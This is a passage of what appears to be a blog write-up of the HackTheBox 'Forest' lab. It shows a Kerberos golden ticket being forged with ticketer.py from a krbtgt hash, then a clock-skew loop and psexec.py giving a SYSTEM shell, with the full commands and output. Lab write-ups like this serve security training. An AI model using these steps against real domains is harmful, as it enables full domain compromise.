+2 packets transmitted, 1 received, 50% packet loss, time 1002ms
+rtt min/avg/max/mdev = 102.752/102.752/102.752/0.000 ms</figure></pre>
+<p>With the <code>ticketer.py</code> script, the hash <code>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::</code> create the administrator.ccache</code> file.
+
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local administrator
+ Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
+ 
+ [*] Creating basic skeleton ticket and PAC Infos
+ [*] Customizing ticket for htb.local/administrator
+ [*]     PAC_LOGON_INFO
+ [*]     PAC_CLIENT_INFO_TYPE
+ [*]     EncTicketPart
+ [*]     EncAsRepPart
+ [*] Signing/Encrypting final ticket
+ [*]     PAC_SERVER_CHECKSUM
+ [*]     PAC_PRIVSVR_CHECKSUM
+ [*]     EncTicketPart
+ [*]     EncASRepPart
+ [*] Saving ticket in administrator.ccache</figure></pre>
+ <p>Add as a global variable the administrator.ccache.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+|
+|-->{SFire129}#export KRB5CCNAME=administrator.ccache</figure></pre>
+<p>Run the <code>psexec.py HTB.LOCAL/administrator@forest -k -no-pass -debug</code> but not work for error.
+ <img src="/images/hackthebox/exploit/forest/22.png" alt=""></p>
+ <p>The error show a problem between date/time local system and date/time with the AD.
+  <img src="/images/hackthebox/exploit/forest/20.png" alt=""></p>
+ <p>The problem in this case is with hour, <code> clock-skew</code>, for launch fastest, build an script.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+|                                                                                                                                                                          
+|-->{SFire129}#for i in $(seq 00 24); do date -s $i:53:00;  psexec.py htb.local/administrator@10.10.10.161 -k -no-pass; done
+ Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
+ [*] Requesting shares on forest.....
+ [*] Found writable share ADMIN$
+ [*] Uploading file TiINlFvE.exe
+ [*] Opening SVCManager on forest.....
+ [*] Creating service BfcS on forest.....
+ [*] Starting service BfcS.....
+ [!] Press help for extra shell commands
+ Microsoft Windows [Version 10.0.14393]
+ (c) 2016 Microsoft Corporation. All rights reserved.
+ 
+ C:\Windows\system32>whoami
+ nt authority\system
+ 
+ C:\Windows\system32></figure></pre>
+
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-25</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Bloodhound</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
